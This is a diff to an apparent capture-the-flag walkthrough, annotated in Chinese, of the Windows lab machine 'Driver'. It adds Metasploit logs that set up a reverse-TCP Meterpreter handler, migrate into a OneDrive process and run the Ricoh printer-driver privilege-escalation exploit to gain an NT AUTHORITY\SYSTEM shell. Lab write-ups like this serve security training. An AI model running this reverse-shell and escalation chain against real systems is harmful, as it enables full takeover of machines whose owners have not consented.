@@ -22,6 +22,8 @@ Command=ToggleDecktop
 
 [1] payload => windows/x64/meterpreter/reverse_tcp //一个 普通用户权限的 Meterpreter shell（tony）
 [★]$ msfconsole
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+
 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_tcp
 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost tun0
@@ -212,6 +214,7 @@ makerc command
 
 Metasploit Documentation: https://docs.metasploit.com/
 
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_tcp
@@ -438,6 +441,7 @@ lhost => tun0
 [*] Adding printer gxkJDRUIG...
 
 ```
+#### 要进入SYSTEM 是不需要再运行shell.exe
 ```
 *Evil-WinRM* PS C:\Users\tony\music> .\shell.exe
 ```
@@ -458,3 +462,55 @@ Server username: DRIVER\tony
 
 (Meterpreter 2)(C:\Users\tony) > cd Desktop
 (Meterpreter 2)(C:\Users\tony\Desktop) > cat user.txt
+```
+#### 
+```
+4496  3232  OneDrive.ex  x86   1        DRIVER\tony  C:\Users\tony\AppData\Lo
+             e                                        cal\Microsoft\OneDrive\O
+                                                      neDrive.exe
+
+
+(Meterpreter 1)(C:\Users\tony\Music) > migrate 4496
+[*] Migrating from 4264 to 4496...
+[*] Migration completed successfully.
+(Meterpreter 1)(C:\Windows\system32) > 
+Background session 1? [y/N]  y
+[-] Unknown command: y. Run the help command for more details.
+[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use exploit/windows/local/ricoh_driver_privesc
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> set session 1
+session => 1
+[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> run
+[*] Started reverse TCP handler on 209.151.152.60:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
+[-] Exploit aborted due to failure: bad-config: The payload should use the same architecture as the target driver
+[*] Deleting printer 
+[*] Exploit completed, but no session was created.
+[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> set session 1
+session => 1
+[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> set lhost tun0
+lhost => tun0
+[msf](Jobs:0 Agents:1) exploit(windows/local/ricoh_driver_privesc) >> run
+[*] Started reverse TCP handler on 10.10.14.93:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
+[*] Adding printer wHgSxgD...
+[*] Sending stage (203846 bytes) to 10.129.95.238
+[+] Deleted C:\Users\tony\AppData\Local\Temp\tOgpAx.bat
+[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
+[*] Meterpreter session 2 opened (10.10.14.93:4444 -> 10.129.95.238:49421) at 2026-02-04 02:37:50 -0600
+[*] Deleting printer wHgSxgD
+
+(Meterpreter 2)(C:\Windows\system32) > shell
+Process 3812 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.10240]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
